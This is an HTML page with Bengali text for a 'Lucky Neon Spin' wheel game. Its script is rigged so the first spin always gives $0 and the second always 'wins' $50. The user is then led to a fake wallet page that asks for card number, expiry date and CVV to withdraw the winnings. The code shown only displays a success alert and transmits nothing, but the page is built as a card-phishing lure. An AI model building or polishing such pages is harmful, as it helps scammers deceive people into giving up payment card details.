<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neon Gaming Spin & Win</title>
    <style>
        /* প্রফেশনাল কালারফুল গেমিং থিম */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        body { 
            background: #0d1117; /* গাঢ় ব্যাকগ্রাউন্ড */
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            overflow-y: auto; 
            padding: 20px 0;
        }

        .container { 
            width: 100%; 
            max-width: 450px; 
            text-align: center; 
            padding: 20px; 
            background: rgba(255, 255, 255, 0.03); 
            border-radius: 20px; 
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.1); /* নিয়ন গ্লো */
        }
        
        h1 { 
            font-size: 26px; 
            margin-bottom: 25px; 
            background: linear-gradient(90deg, #00f2fe, #4facfe); /* টেক্সট গ্রেডিয়েন্ট */
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 15px rgba(0, 242, 254, 0.5);
        }

        /* স্পিন হুইল ডিজাইন - আরও বেশি কালারফুল */
        .wheel-box { 
            position: relative; 
            width: 320px; 
            height: 320px; 
            margin: 0 auto; 
            border: 12px solid #161b22; 
            border-radius: 50%; 
            box-shadow: 0 0 40px rgba(0,0,0,0.8), 0 0 20px rgba(0, 242, 254, 0.2); 
        }
        
        .wheel { 
            width: 100%; 
            height: 100%; 
            border-radius: 50%; 
            position: relative; 
            overflow: hidden; 
            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1); 
            background: #161b22;
        }

        .segment { 
            position: absolute; 
            width: 50%; 
            height: 50%; 
            transform-origin: bottom right; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            border: 1px solid rgba(255,255,255,0.05); 
        }

        .segment span { 
            position: absolute; 
            transform: rotate(45deg); 
            font-weight: bold; 
            font-size: 14px; 
            color: #fff; 
            left: 20px; 
            top: 20px; 
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
        }

        /* চাকার ইন্ডিকেটর */
        .pointer { 
            position: absolute; 
            top: -25px; 
            left: 50%; 
            transform: translateX(-50%); 
            width: 45px; 
            height: 45px; 
            background: #ff0055; /* নিয়ন রেড */
            clip-path: polygon(50% 100%, 0 0, 100% 0); 
            z-index: 20; 
            filter: drop-shadow(0 0 10px #ff0055);
        }

        .center-circle {
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            width: 60px; 
            height: 60px; 
            background: #fff; 
            border-radius: 50%; 
            z-index: 10;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            display: flex; 
            justify-content: center; 
            align-items: center;
            border: 5px solid #00f2fe;
            font-weight: bold;
            color: #000;
        }

        /* গ্রেডিয়েন্ট বাটন স্টাইল */
        .btn { 
            margin-top: 35px; 
            padding: 18px 45px; 
            font-size: 20px; 
            background: linear-gradient(45deg, #ff0055, #ffcc00); /* রেড-গোল্ড গ্রেডিয়েন্ট */
            color: #fff; 
            border: none; 
            border-radius: 50px; 
            font-weight: bold; 
            cursor: pointer; 
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.3s;
            box-shadow: 0 8px 25px rgba(255, 0, 85, 0.3);
        }

        .btn:hover {
            box-shadow: 0 10px 30px rgba(255, 0, 85, 0.5);
            transform: translateY(-2px);
        }

        .btn:disabled { 
            background: #444; 
            color: #777; 
            box-shadow: none;
            cursor: not-allowed;
            transform: none;
        }

        /* ওয়ালেট এবং ব্যালেন্স বক্স - নিয়ন গ্লো */
        .balance-box { 
            background: rgba(0, 242, 254, 0.05); 
            padding: 20px; 
            border-radius: 15px; 
            border: 2px solid #00f2fe; 
            margin-bottom: 30px; 
            box-shadow: 0 0 20px rgba(0, 242, 254, 0.2);
        }
        
        .balance-box h2 { 
            color: #00f2fe; 
            font-size: 45px; 
            text-shadow: 0 0 15px rgba(0, 242, 254, 0.6);
        }

        /* কালারফুল কার্ড ডিজাইন */
        .wallet-card { 
            background: linear-gradient(135deg, #ff0055, #ffcc00); /* কার্ড গ্রেডিয়েন্ট */
            padding: 30px; 
            border-radius: 20px; 
            text-align: left; 
            margin-bottom: 25px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            position: relative;
            overflow: hidden;
        }
        
        .wallet-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: rgba(255, 255, 255, 0.1);
            transform: rotate(30deg);
        }

        .wallet-card .card-type {
            font-weight: bold; 
            color: #fff; 
            font-size: 20px; 
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .wallet-card .chip { 
            width: 50px; 
            height: 38px; 
            background: linear-gradient(135deg, #ffd700, #b8860b); 
            border-radius: 6px; 
            margin: 20px 0; 
            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }
        
        .wallet-card .card-number { 
            font-size: 22px; 
            letter-spacing: 3px; 
            font-family: 'Courier New', monospace;
            color: #fff;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
        }
        
        .wallet-card .expiry { 
            font-size: 12px; 
            color: rgba(255, 255, 255, 0.8); 
            margin-top: 15px; 
        }

        /* উইথড্রো ফর্ম - মডার্ন ডিজাইন */
        .withdraw-section { 
            background: rgba(255, 255, 255, 0.03); 
            padding: 25px; 
            border-radius: 20px; 
            border: 1px solid rgba(255,255,255,0.05); 
            text-align: left; 
        }
        
        .withdraw-section h3 { 
            margin-bottom: 20px; 
            color: #ffcc00; 
            font-size: 20px; 
            text-align: center; 
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .input-group { margin-bottom: 18px; }
        .input-group label { display: block; font-size: 13px; color: #aaa; margin-bottom: 8px; }
        .input-group input { 
            width: 100%; 
            padding: 14px; 
            border-radius: 10px; 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            background: #161b22; 
            color: #fff; 
            outline: none; 
            transition: 0.3s;
        }
        
        .input-group input:focus { 
            border-color: #00f2fe; 
            box-shadow: 0 0 10px rgba(0, 242, 254, 0.3);
        }
        
        .save-btn { 
            background: linear-gradient(45deg, #22c55e, #16a34a); /* গ্রিন গ্রেডিয়েন্ট */
            color: #fff; 
            padding: 14px; 
            width: 100%; 
            border: none; 
            border-radius: 10px; 
            font-weight: bold; 
            cursor: pointer; 
            margin-top: 15px; 
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.3s;
            box-shadow: 0 5px 15px rgba(34, 197, 94, 0.3);
        }
        
        .save-btn:hover {
            box-shadow: 0 8px 20px rgba(34, 197, 94, 0.5);
            transform: translateY(-2px);
        }

        .hidden { display: none; }
        
        /* স্ট্যাটাস মেসেজ কালার */
        #status b { color: #ffcc00; }
        #status span { color: #2ecc71; font-size: 20px; }
    </style>
</head>
<body>

    <audio id="spinSound" src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3"></audio>
    <audio id="winSound" src="https://www.soundjay.com/misc/sounds/success-fanfare-trumpets-10.mp3"></audio>

    <div id="game-page" class="container">
        <h1>LUCKY NEON SPIN</h1>
        <div class="wheel-box">
            <div class="pointer"></div>
            <div class="center-circle">SPIN</div>
            <div id="wheel" class="wheel">
                <div class="segment" style="transform: rotate(0deg); background: #ff0055;"><span>$0</span></div>
                <div class="segment" style="transform: rotate(30deg); background: #00f2fe;"><span>$10</span></div>
                <div class="segment" style="transform: rotate(60deg); background: #2ecc71;"><span>$50</span></div>
                <div class="segment" style="transform: rotate(90deg); background: #ffcc00;"><span>$5</span></div>
                <div class="segment" style="transform: rotate(120deg); background: #9b59b6;"><span>$20</span></div>
                <div class="segment" style="transform: rotate(150deg); background: #ff7700;"><span>$0</span></div>
                <div class="segment" style="transform: rotate(180deg); background: #1abc9c;"><span>$100</span></div>
                <div class="segment" style="transform: rotate(210deg); background: #34495e;"><span>$2</span></div>
                <div class="segment" style="transform: rotate(240deg); background: #e056fd;"><span>$15</span></div>
                <div class="segment" style="transform: rotate(270deg); background: #ff0055;"><span>$50</span></div>
                <div class="segment" style="transform: rotate(300deg); background: #2ecc71;"><span>$5</span></div>
                <div class="segment" style="transform: rotate(330deg); background: #00f2fe;"><span>$0</span></div>
            </div>
        </div>
        <button id="spinBtn" class="btn" onclick="playGame()">SPIN NOW</button>
        <p id="status" style="margin-top: 25px; font-weight: bold; min-height: 40px;"></p>
    </div>

    <div id="wallet-page" class="container hidden">
        <div class="balance-box">
            <p style="color: #94a3b8; font-size: 14px;">AVAILABLE BALANCE</p>
            <h2 id="final-balance">$0.00</h2>
        </div>

        <div class="wallet-card">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <span class="card-type">VISA</span>
                <span style="font-size: 10px; color: rgba(255,255,255,0.7);">PREPAID</span>
            </div>
            <div class="chip"></div>
            <div class="card-number">**** **** **** 1122</div>
            <div class="expiry">EXPIRY: 03/30</div>
        </div>

        <div class="withdraw-section">
            <h3>WITHDRAW METHOD</h3>
            <div class="input-group">
                <label>কার্ড নম্বর</label>
                <input type="text" id="cardNum" placeholder="1234 5678 9012 3456">
            </div>
            <div style="display: flex; gap: 15px;">
                <div class="input-group" style="flex: 2;">
                    <label>মেয়াদ (MM/YY)</label>
                    <input type="text" id="cardExp" placeholder="12/28">
                </div>
                <div class="input-group" style="flex: 1;">
                    <label>CVV</label>
                    <input type="password" id="cardCvv" placeholder="***">
                </div>
            </div>
            <button class="save-btn" onclick="saveWithdraw()">সেভ করুন</button>
        </div>
    </div>

    <script>
        let spinStep = 0;
        const spinSound = document.getElementById('spinSound');
        const winSound = document.getElementById('winSound');

        function playGame() {
            spinStep++;
            document.getElementById('spinBtn').disabled = true;
            spinSound.play();

            if (spinStep === 1) {
                // ১ম বার স্পিন: $0 ঘরে (১৮০০ ডিগ্রি)
                document.getElementById('wheel').style.transform = "rotate(1800deg)";
                setTimeout(() => {
                    spinSound.pause();
                    document.getElementById('status').innerHTML = "দুঃখিত! আপনি $0 পেয়েছেন। <br><b>আরেকটি সুযোগ বাকি আছে!</b>";
                    document.getElementById('spinBtn').disabled = false;
                    document.getElementById('spinBtn').innerText = "TRY AGAIN";
                }, 5100);
            } 
            else if (spinStep === 2) {
                // ২য় বার স্পিন: $50 ঘরে (৩৯০০ ডিগ্রি)
                document.getElementById('wheel').style.transform = "rotate(3900deg)";
                setTimeout(() => {
                    spinSound.pause();
                    winSound.play();
                    document.getElementById('status').innerHTML = "<span>অভিনন্দন! আপনি $50.00 জিতেছেন!</span>";
                    document.getElementById('spinBtn').innerText = "CLAIM TO WALLET";
                    document.getElementById('spinBtn').disabled = false;
                    document.getElementById('spinBtn').style.background = "linear-gradient(45deg, #2ecc71, #16a34a)";
                    document.getElementById('spinBtn').style.boxShadow = "0 8px 25px rgba(34, 197, 94, 0.3)";
                    
                    document.getElementById('spinBtn').onclick = () => {
                        winSound.pause();
                        document.getElementById('game-page').style.display = 'none';
                        document.getElementById('wallet-page').classList.remove('hidden');
                        animateBalance();
                    };
                }, 5100);
            }
        }

        function animateBalance() {
            let b = 0;
            let int = setInterval(() => {
                if(b >= 50) clearInterval(int);
                document.getElementById('final-balance').innerText = "$" + b.toFixed(2);
                b++;
            }, 35);
        }

        function saveWithdraw() {
            const num = document.getElementById('cardNum').value;
            if(num.length < 10) {
                alert("দয়া করে সঠিক কার্ড নম্বর দিন।");
            } else {
                alert("আপনার কার্ডটি সফলভাবে সেভ হয়েছে। উইথড্রো প্রসেসিং চলছে...");
            }
        }
    </script>
</body>
</html>
